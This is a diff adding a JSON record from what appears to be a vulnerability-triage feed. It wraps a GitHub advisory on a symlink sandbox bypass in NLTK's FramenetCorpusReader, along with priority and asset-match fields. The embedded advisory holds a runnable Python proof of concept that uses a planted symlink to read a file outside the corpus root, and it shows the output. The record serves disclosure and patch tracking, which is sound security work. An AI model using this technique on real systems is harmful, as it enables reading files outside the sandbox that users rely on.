@@ -1,0 +1,60 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/61110758?v=4\", \"events_url\": \"https://api.github.com/users/LiteshGhute/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/LiteshGhute/followers\", \"following_url\": \"https://api.github.com/users/LiteshGhute/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/LiteshGhute/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/LiteshGhute\", \"id\": 61110758, \"login\": \"LiteshGhute\", \"node_id\": \"MDQ6VXNlcjYxMTEwNzU4\", \"organizations_url\": \"https://api.github.com/users/LiteshGhute/orgs\", \"received_events_url\": \"https://api.github.com/users/LiteshGhute/received_events\", \"repos_url\": \"https://api.github.com/users/LiteshGhute/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/LiteshGhute/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/LiteshGhute/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/LiteshGhute\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-62384\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 8.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}, {\"cwe_id\": \"CWE-59\", \"name\": \"Improper Link Resolution Before File Access ('Link Following')\"}], \"description\": \"This is a **new, distinct vulnerability**: a bypass of the fix already published as [GHSA-xh95-f55m-82fw](https://github.com/nltk/nltk/security/advisories/GHSA-xh95-f55m-82fw) (\\\"Path traversal in NLTK FramenetCorpusReader.frame() allows arbitrary XML file read, bypassing the nltk.pathsec sandbox\\\"), not a duplicate of it.\\n\\n## Summary\\n\\nThe original advisory was fixed (PR [#3581](https://github.com/nltk/nltk/pull/3581)) by adding `_reject_unsafe_path_component()`, which blocks literal `/`, `\\\\`, `..`, and Windows drive prefixes in caller-/corpus-supplied names. It never resolves symlinks. All three call sites that use this guard still resolve the resulting path through `self.abspath()` (`nltk/corpus/reader/api.py`, `self._root.join(fileid)`), which is a plain lexical join, not the symlink-resolving, `required_root`-scoped check that `CorpusReader.open()` (and `NKJPCorpusReader`'s own fix for its sibling advisory) correctly use elsewhere in this same codebase.\\n\\nA symlink placed inside the corpus's own subdirectory, with a name containing no separators at all, passes the guard cleanly and reads a file completely outside the corpus root.\\n\\n## Affected code (`nltk/corpus/reader/framenet.py`)\\n\\n- `frame_by_name()` reads `<frame_dir>/<name>.xml`\\n- `_lu_file()` reads `<lu_dir>/lu<id>.xml`\\n- `doc()` reads `<fulltext_dir>/<filename>`\\n\\nAll three follow the same chain: `_reject_unsafe_path_component(value, ...)`, then `self.abspath(os.path.join(subdir, value))`, then `XMLCorpusView(...)`, opened via `PathPointer.open()` with no `required_root`.\\n\\n## Proof of concept\\n\\nSelf-contained, runnable end to end.\\n\\n```python\\nimport os\\nimport tempfile\\n\\nfrom nltk.corpus.reader.framenet import FramenetCorpusReader\\n\\nroot = tempfile.mkdtemp()\\ncorpus_root = os.path.join(root, \\\"framenet_v17\\\")\\nframe_dir = os.path.join(corpus_root, \\\"frame\\\")\\nsecret_dir = os.path.join(root, \\\"outside_framenet_root\\\")\\nos.makedirs(frame_dir)\\nos.makedirs(secret_dir)\\n\\nwith open(os.path.join(corpus_root, \\\"frRelation.xml\\\"), \\\"w\\\") as f:\\n    f.write(\\\"<frameRelations/>\\\")\\n\\nsecret_path = os.path.join(secret_dir, \\\"stolen.xml\\\")\\nwith open(secret_path, \\\"w\\\") as f:\\n    f.write(\\n        '<frame cBy=\\\"000\\\" cDate=\\\"01/01/2000\\\" name=\\\"StolenFrame\\\" ID=\\\"999999\\\">'\\n        \\\"<definition>THIS CAME FROM OUTSIDE THE FRAMENET CORPUS ROOT</definition>\\\"\\n        \\\"</frame>\\\"\\n    )\\n\\n# Attacker plants this inside <corpus_root>/frame/. No path separators,\\n# so it passes _reject_unsafe_path_component cleanly.\\nlink_path = os.path.join(frame_dir, \\\"evil_link.xml\\\")\\nos.symlink(secret_path, link_path)\\n\\nreader = FramenetCorpusReader(corpus_root, [])\\nreader._frame_idx = {\\\"__dummy__\\\": {\\\"name\\\": \\\"__dummy__\\\"}}  # skip unrelated index build\\n\\nresult = reader.frame_by_name(\\\"evil_link\\\")   # normal, routine call, no \\\"..\\\" anywhere\\nprint(\\\"frame name:\\\", result[\\\"name\\\"])\\nprint(\\\"definition:\\\", result[\\\"definition\\\"])\\n```\\n\\nActual output when run against unpatched `main` (commit `35813c8`):\\n\\n```\\nframe name: StolenFrame\\ndefinition: THIS CAME FROM OUTSIDE THE FRAMENET CORPUS ROOT\\n```\\n\\nThat content was read from `secret_path`, a file entirely outside `corpus_root`, via a single, unmodified, public API call. No exception is raised anywhere in the chain; `_reject_unsafe_path_component` passes because `\\\"evil_link\\\"` contains no separators, `..`, or drive prefix.\\n\\nVerified the same way for the other two affected call sites, `_lu_file()` (`lu<id>.xml` symlink under `lu/`) and `doc()` (arbitrary filename symlink under `fulltext/`), both succeeding identically with no exception raised.\\n## Why this is in scope\\n\\n- No malicious file for a victim to open, no special user interaction. Just a tampered/shared corpus directory (NLTK's own `SECURITY.md` names \\\"shared environments... multi-tenant pipelines\\\" as its threat model) plus a completely normal API call.\\n- Core corpus-reader code, not a demo/GUI tool.\\n- Confirmed unintentional: PR #3581's own description states the goal was to route through \\\"the `nltk.pathsec` sandbox... including the strict `ENFORCE=True` mode\\\" and be \\\"consistent with the validation already used elsewhere in NLTK.\\\" It doesn't achieve that, since `abspath()` never reaches the scoped, symlink-resolving check that exists and is used correctly elsewhere in the same file tree (`NKJPCorpusReader`).\\n\\n## Suggested fix\\n\\nRoute all three call sites through `CorpusReader.open()` (or pass `required_root=self._root` to `validate_path()` directly, as `NKJPCorpusReader` already does), instead of `self.abspath()` plus raw `PathPointer.open()`.\", \"epss\": {\"percentage\": 0.00563, \"percentile\": 0.44734}, \"ghsa_id\": \"GHSA-f833-7jw8-xwrv\", \"github_reviewed_at\": \"2026-09-08T16:39:24Z\", \"html_url\": \"https://github.com/advisories/GHSA-f833-7jw8-xwrv\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-f833-7jw8-xwrv\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-62384\"}], \"nvd_published_at\": null, \"published_at\": \"2026-09-08T16:39:24Z\", \"references\": [\"https://github.com/nltk/nltk/security/advisories/GHSA-f833-7jw8-xwrv\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-62384\", \"https://github.com/nltk/nltk/pull/3726\", \"https://github.com/nltk/nltk/commit/736d3212a47de2005b85b785dde6720556d3925d\", \"https://github.com/nltk/nltk/releases/tag/v3.10.2\", \"https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3789.yaml\", \"https://www.vulncheck.com/advisories/nltk-framenetcorpusreader-symlink-sandbox-bypass-before\", \"https://github.com/advisories/GHSA-f833-7jw8-xwrv\"], \"repository_advisory_url\": \"https://api.github.com/repos/nltk/nltk/security-advisories/GHSA-f833-7jw8-xwrv\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/nltk/nltk\", \"summary\": \"NLTK: Symlink-based sandbox bypass in FramenetCorpusReader (bypasses the fix for CVE-2026-54292)\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-08T16:39:28Z\", \"url\": \"https://api.github.com/advisories/GHSA-f833-7jw8-xwrv\", \"vulnerabilities\": [{\"first_patched_version\": \"3.10.2\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"nltk\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 3.10.0, < 3.10.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-f833-7jw8-xwrv",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "nltk: >= 3.10.0, < 3.10.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-54292",
+      "CVE-2026-62384"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "nltk"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-08T19:13:18.179644Z",
+  "provenance": {
+    "content_sha256": "dc343903d438a99cf794649587b899585bb9d78de26a2cc1666538d41d6820e4",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-08T16:39:24Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-f833-7jw8-xwrv",
+  "status": "active",
+  "title": "NLTK: Symlink-based sandbox bypass in FramenetCorpusReader (bypasses the fix for CVE-2026-54292)",
+  "updated_at": "2026-09-08T16:39:28Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-f833-7jw8-xwrv"
+}
